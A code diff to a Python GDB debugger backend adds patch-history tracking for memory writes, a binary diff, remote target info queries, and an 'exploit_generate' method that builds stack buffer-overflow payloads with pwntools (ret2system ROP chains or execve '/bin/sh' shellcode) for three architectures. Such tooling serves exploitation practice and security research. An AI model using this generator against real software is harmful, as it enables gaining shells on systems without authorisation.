@@ -23,6 +23,7 @@ class GDBBackend:
         self._output_queue: asyncio.Queue[bytes] = asyncio.Queue()
         self._reader_task: Optional[asyncio.Task] = None
         self._async_events: list[dict] = []
+        self._patch_history: list[dict] = []
         self._gdb_version_checked = False
         self._pwntools_available: bool = False
         try:
@@ -268,6 +269,17 @@ class GDBBackend:
             if rec["type"] == "error":
                 msg = rec["values"].get("msg", "Unknown GDB error")
                 raise GDBBackendError(msg)
+
+    def _record_patch(self, address: str, original: str, new: str, size: int, description: str = ""):
+        import datetime
+        self._patch_history.append({
+            "address": address,
+            "original": original,
+            "new": new,
+            "size": size,
+            "description": description,
+            "timestamp": datetime.datetime.now().isoformat(),
+        })
 
     def _extract_value(self, parsed: dict, key: str) -> Optional[str]:
         for rec in parsed["records"]:
@@ -562,19 +574,46 @@ class GDBBackend:
         return output
 
     async def write_memory(self, address: str, data: str) -> str:
+        try:
+            orig = await self._send_command(f"print/x *({address})")
+            orig_parsed = self._parse_mi_result(orig)
+            original_val = ""
+            for rec in orig_parsed["records"]:
+                if rec["type"] == "done" and "value" in rec["values"]:
+                    original_val = rec["values"]["value"]
+        except Exception:
+            original_val = "?"
         output = await self._send_command(f"set *({address}) = {data}")
         parsed = self._parse_mi_result(output)
         self._check_error(parsed)
+        self._record_patch(address, original_val, data, 1)
         return f"Written to {address}"
 
     async def write_memory_bytes(self, address: str, hex_bytes: str) -> str:
         hex_bytes = hex_bytes.replace(" ", "").replace("0x", "").replace("\\x", "")
         if len(hex_bytes) % 2 != 0:
             hex_bytes = "0" + hex_bytes
+        try:
+            output_orig = await self._send_command(f"-data-read-memory-bytes {address} {len(hex_bytes)//2}")
+            orig_parsed = self._parse_mi_result(output_orig)
+            original_hex = ""
+            for rec in orig_parsed["records"]:
+                memory_val = rec["values"].get("memory", "")
+                if memory_val:
+                    entries = self._parse_mi_list(memory_val)
+                    for entry in entries:
+                        if isinstance(entry, dict):
+                            contents = entry.get("contents", "")
+                            if contents:
+                                original_hex = contents
+        except Exception:
+            original_hex = ""
         output = await self._send_command(f"set *((unsigned char*){address}) = {{{hex_bytes}}}")
         parsed = self._parse_mi_result(output)
         self._check_error(parsed)
-        return f"Written {len(hex_bytes)//2} bytes to {address}"
+        size = len(hex_bytes) // 2
+        self._record_patch(address, original_hex, hex_bytes, size)
+        return f"Written {size} bytes to {address}"
 
     async def hex_dump(self, address: str, count: int = 128) -> str:
         output = await self._send_command(f"-data-read-memory-bytes {address} {count}")
@@ -2871,6 +2910,177 @@ class GDBBackend:
             "status": status,
         }
         return json.dumps(state, indent=2, ensure_ascii=False)
+
+    async def get_patch_history(self) -> str:
+        if not self._patch_history:
+            return "No patches recorded in this session"
+        lines = [f"Patch history ({len(self._patch_history)} patches):", ""]
+        for i, p in enumerate(self._patch_history):
+            lines.append(f"  [{i}] {p['address']} ({p['size']} bytes): {p['original']} -> {p['new']}")
+            if p.get("description"):
+                lines.append(f"      {p['description']}")
+        return "\n".join(lines)
+
+    async def clear_patch_history(self) -> str:
+        self._patch_history.clear()
+        return "Patch history cleared"
+
+    async def binary_diff(self) -> str:
+        binary = self._binary
+        if not binary:
+            return "No binary loaded"
+        try:
+            with open(binary, "rb") as f:
+                original = f.read()
+            ep_str = await self.get_entry_point()
+            try:
+                ep = int(ep_str, 16)
+            except ValueError:
+                ep = 0
+            mem_size = min(len(original), 4096)
+            mem_output = await self._send_command(f"-data-read-memory-bytes 0x{ep:x} {mem_size}")
+            mem_parsed = self._parse_mi_result(mem_output)
+            mem_bytes = b""
+            for rec in mem_parsed["records"]:
+                memory_val = rec["values"].get("memory", "")
+                if memory_val:
+                    entries = self._parse_mi_list(memory_val)
+                    for entry in entries:
+                        if isinstance(entry, dict):
+                            contents = entry.get("contents", "")
+                            if contents:
+                                mem_bytes = bytes.fromhex(contents)
+            if mem_bytes and len(mem_bytes) <= len(original):
+                diff_count = 0
+                for i in range(len(mem_bytes)):
+                    if i < len(original) and mem_bytes[i] != original[i]:
+                        diff_count += 1
+                return (f"Original: {len(original)} bytes, Memory read: {len(mem_bytes)} bytes\n"
+                        f"Differing bytes: {diff_count}")
+            return f"Original: {len(original)} bytes\nMemory read: {len(mem_bytes)} bytes"
+        except Exception as e:
+            return f"Error: {e}"
+
+    async def remote_arch(self) -> str:
+        """Detect remote target architecture via GDB."""
+        resp = await self._send_command("info target")
+        lines = resp.split("\n") if isinstance(resp, str) else [str(resp)]
+        arch_resp = await self._send_command("show architecture")
+        target_resp = await self._send_command("target asm")
+        return (
+            f"Remote target info:\n"
+            f"  Architecture: {arch_resp.strip() if isinstance(arch_resp, str) else arch_resp}\n"
+            f"  Target:       {target_resp.strip() if isinstance(target_resp, str) else target_resp}\n"
+            f"  Debug:        {resp.strip() if isinstance(resp, str) else resp}"
+        )
+
+    async def remote_info(self) -> str:
+        """Show detailed remote target information."""
+        features = await self._send_command("info features")
+        threads = await self._send_command("info threads")
+        arch = await self._send_command("show architecture")
+        os = await self._send_command("show os")
+        endian = await self._send_command("show endian")
+        return (
+            f"Remote target details:\n"
+            f"  Architecture: {arch.strip() if isinstance(arch, str) else arch}\n"
+            f"  OS:           {os.strip() if isinstance(os, str) else os}\n"
+            f"  Endian:       {endian.strip() if isinstance(endian, str) else endian}\n"
+            f"  Features:     {features.strip() if isinstance(features, str) else features}\n"
+            f"  Threads:      {threads.strip() if isinstance(threads, str) else threads}"
+        )
+
+    async def exploit_generate(self, binary_path: str, offset: int,
+                                cmd: str = "/bin/sh",
+                                save_path: str = "",
+                                arch: str = "amd64") -> str:
+        """Generate a BOF exploit payload: offset + ROP chain + shellcode.
+
+        Uses pwntools internally. Requires pwntools to be installed.
+        """
+        if not self._pwntools_available:
+            return "Error: pwntools not available (pip install pwntools)"
+        try:
+            import pwn
+            context = pwn.context
+            if arch == "amd64":
+                context.arch = "amd64"
+                context.os = "linux"
+            elif arch == "i386":
+                context.arch = "i386"
+                context.os = "linux"
+            elif arch == "aarch64":
+                context.arch = "aarch64"
+                context.os = "linux"
+            else:
+                return f"Error: unsupported arch '{arch}' (use amd64, i386, aarch64)"
+
+            elf = pwn.ELF(binary_path, checksec=False)
+            payload = b""
+
+            if arch == "amd64":
+                rop = pwn.ROP(elf)
+                pop_rdi = rop.find_gadget(["pop rdi", "ret"])
+                if pop_rdi:
+                    pop_rdi_addr = pop_rdi.address
+                else:
+                    pop_rdi_addr = 0
+
+                bin_sh = next(elf.search(b"/bin/sh\x00"), 0)
+                system_addr = elf.plt.get("system", 0)
+
+                if not system_addr:
+                    system_addr = elf.symbols.get("system", 0)
+
+                if pop_rdi_addr and bin_sh and system_addr:
+                    payload = b"A" * offset
+                    payload += pwn.p64(pop_rdi_addr)
+                    payload += pwn.p64(bin_sh)
+                    payload += pwn.p64(system_addr)
+                else:
+                    sc_src = pwn.shellcraft.execve(cmd, 0, 0)
+                    sc_bytes = pwn.asm(sc_src)
+                    payload = b"A" * offset
+                    payload += pwn.p64(elf.symbols.get("__libc_csu_init", elf.entry))
+                    payload += sc_bytes
+            elif arch == "i386":
+                system_addr = elf.plt.get("system", 0)
+                bin_sh = next(elf.search(b"/bin/sh\x00"), 0)
+                if system_addr and bin_sh:
+                    payload = b"A" * offset
+                    payload += pwn.p32(system_addr)
+                    payload += pwn.p32(0)  # return address after system
+                    payload += pwn.p32(bin_sh)
+                else:
+                    sc_src = pwn.shellcraft.execve(cmd, 0, 0)
+                    sc_bytes = pwn.asm(sc_src)
+                    payload = b"A" * offset
+                    payload += pwn.p32(elf.entry)
+                    payload += sc_bytes
+            elif arch == "aarch64":
+                sc_src = pwn.shellcraft.execve(cmd, 0, 0)
+                sc_bytes = pwn.asm(sc_src)
+                payload = b"A" * offset
+                payload += pwn.p64(elf.entry)
+                payload += sc_bytes
+
+            result_lines = [
+                f"Exploit generated for {binary_path}",
+                f"  Architecture: {arch}",
+                f"  Offset: {offset} bytes to return address",
+                f"  Payload size: {len(payload)} bytes",
+                f"  Payload (base64): {__import__('base64').b64encode(payload).decode()}",
+                f"  Payload (hex):   {payload.hex()}",
+            ]
+
+            if save_path:
+                with open(save_path, "wb") as f:
+                    f.write(payload)
+                result_lines.append(f"  Saved to: {save_path}")
+
+            return "\n".join(result_lines)
+        except Exception as e:
+            return f"Error generating exploit: {e}"
 
     async def quit(self) -> None:
         await self._cleanup()
